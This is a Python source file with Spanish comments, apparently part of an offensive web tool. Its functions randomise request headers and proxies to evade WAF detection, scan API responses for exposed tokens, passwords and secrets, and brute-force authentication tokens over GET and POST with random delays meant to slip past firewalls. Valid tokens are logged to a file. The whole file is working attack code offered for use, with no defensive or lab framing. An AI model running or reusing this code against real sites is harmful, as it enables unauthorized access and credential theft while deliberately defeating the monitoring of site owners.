import time
import re
import requests
from colorama import Fore, Style
import random
from urllib.parse import urlencode


def randomizeheaders():
    """Generamos cabeceras HTTP aleatorias para evadir detección"""

    # Lista ampliada de User-Agents para mejorar la evasión
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0',
        'Mozilla/5.0 (Windows NT 6.1; rv:11.0) like Gecko',
        'Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QD1A.200205.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.67'
    ]

    # Lista de idiomas para Accept-Language
    accept_languages = ['en-US,en;q=0.5', 'es-ES,es;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.7',
                        'de-DE,de;q=0.9,en;q=0.7']

    # Lista de codificación para Accept-Encoding
    accept_encodings = ['gzip, deflate', 'gzip, deflate, br', 'identity', 'gzip', 'deflate']

    # Referers aleatorios (estos pueden simular que la solicitud viene de otro lugar)
    referers = [
        'https://www.google.com/',
        'https://www.bing.com/',
        'https://www.yahoo.com/',
        'https://www.reddit.com/',
        'https://www.twitter.com/'
    ]

    # Cabeceras adicionales para mejorar la evasión
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept-Language': random.choice(accept_languages),
        'Accept-Encoding': random.choice(accept_encodings),
        'Referer': random.choice(referers),
        'Origin': 'https://www.google.com',  # Añadido para simular un origen legítimo
        'X-Requested-With': 'XMLHttpRequest',  # Para simular solicitudes AJAX
        'Connection': 'keep-alive',  # Mantener la conexión abierta
        'Upgrade-Insecure-Requests': '1',  # Indicamos que soportamos solicitudes inseguras
        'Cache-Control': 'no-cache',  # Controlar el caché para que no se guarde información innecesaria
        'TE': 'Trailers',  # Cabecera avanzada para mejorar la evasión
    }

    return headers


def evadedetection(url):
    """Evitamos detección mediante técnicas de evasión avanzadas y análisis de respuesta"""

    headers = randomizeheaders()

    # Proxies opcionales para rotación (puedes desactivarlos si no los usas)
    proxies = [
        None,
        # {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
        # {"http": "http://another.proxy:port", "https": "http://another.proxy:port"}
    ]

    try:
        proxy = random.choice(proxies)
        response = requests.get(url, headers=headers, proxies=proxy, timeout=10)
        status = response.status_code

        # Verificación avanzada
        waf_indicators = ["access denied", "forbidden", "not allowed", "security", "blocked", "WAF", "firewall"]
        content = response.text.lower()

        if any(indicator in content for indicator in waf_indicators):
            print(f"{Fore.YELLOW}[!] Posible protección detectada en: {url} (WAF/Firewall){Style.RESET_ALL}")
        elif status == 200:
            print(f"{Fore.GREEN}[+] Conexión exitosa con evasión activa: {url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}[*] Respuesta recibida ({status}): {url}{Style.RESET_ALL}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Error al intentar evadir detección: {e}{Style.RESET_ALL}")


def scanapi(url):
    """Escaneamos APIs expuestas en el sitio web y buscamos posibles credenciales o información sensible"""

    headers = randomizeheaders()
    proxies = [
        None,
        # {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
        # Puedes agregar proxies reales aquí
    ]

    try:
        response = requests.get(url, headers=headers, proxies=random.choice(proxies), timeout=10)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Error al intentar acceder a la API: {e}{Style.RESET_ALL}")
        return None

    if response.status_code == 200:
        print(f"{Fore.GREEN}[+] API encontrada: {url}{Style.RESET_ALL}")
        try:
            api_data = response.json()
            keys_to_check = ['token', 'apikey', 'access_token', 'auth', 'password', 'key', 'secret']
            found = []

            def search_keys(obj):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if k.lower() in keys_to_check:
                            found.append((k, v))
                        search_keys(v)
                elif isinstance(obj, list):
                    for item in obj:
                        search_keys(item)

            search_keys(api_data)

            if found:
                for key, value in found:
                    print(f"{Fore.YELLOW}[!] Posible credencial expuesta → {key}: {value}{Style.RESET_ALL}")
                return found[0][1]  # Retorna el primer valor encontrado
            else:
                print(f"{Fore.CYAN}[*] No se encontraron credenciales en la respuesta JSON.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[-] No se pudo analizar el contenido JSON de la API.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Respuesta no válida ({response.status_code}) desde {url}{Style.RESET_ALL}")

    return None


def bruteforcetokens(url, endpoint, wordlist, verbose=True):
    """Fuerza bruta avanzada para descubrir tokens o credenciales válidas"""
    found_token = None
    token_keys = ['token', 'access_token', 'auth', 'apikey', 'session', 'key']
    success_signatures = ["valid", "success", "authorized", "bienvenido", "acceso concedido", "ok", "log in",
                          "authenticated"]

    if verbose:
        print(f"{Fore.CYAN}[*] Iniciando fuerza bruta sobre: {url}/{endpoint}{Style.RESET_ALL}")

    for word in wordlist:
        random.shuffle(token_keys)  # Cambia orden para cada intento
        for param in token_keys:
            payload = {param: word}
            test_url = f"{url}/{endpoint}"
            headers = randomizeheaders()

            try:
                # GET request con parámetros dinámicos
                full_url = f"{test_url}?{urlencode(payload)}"
                response = requests.get(full_url, headers=headers, timeout=10)

                # Intentar también POST si GET no da resultado
                if response.status_code != 200 or not any(sig in response.text.lower() for sig in success_signatures):
                    response = requests.post(test_url, data=payload, headers=headers, timeout=10)

                # Evaluamos si la respuesta es exitosa
                if response.status_code in [200, 201] and any(
                        sig in response.text.lower() for sig in success_signatures):
                    print(f"{Fore.GREEN}[+] Token válido encontrado: {param}={word} → {full_url}{Style.RESET_ALL}")
                    with open("tokens_validos.txt", "a") as f:
                        f.write(f"{param}={word} → {full_url}\n")
                    found_token = word
                    return found_token

                elif verbose:
                    print(f"{Fore.YELLOW}[-] Token inválido: {param}={word}{Style.RESET_ALL}")

                # Espera aleatoria entre 100ms y 400ms para evitar WAFs
                time.sleep(random.uniform(0.1, 0.4))

            except requests.exceptions.RequestException as e:
                if verbose:
                    print(f"{Fore.RED}[!] Error al probar token '{word}': {e}{Style.RESET_ALL}")

    if verbose:
        print(f"{Fore.MAGENTA}[x] No se encontró ningún token válido.{Style.RESET_ALL}")

    return found_token
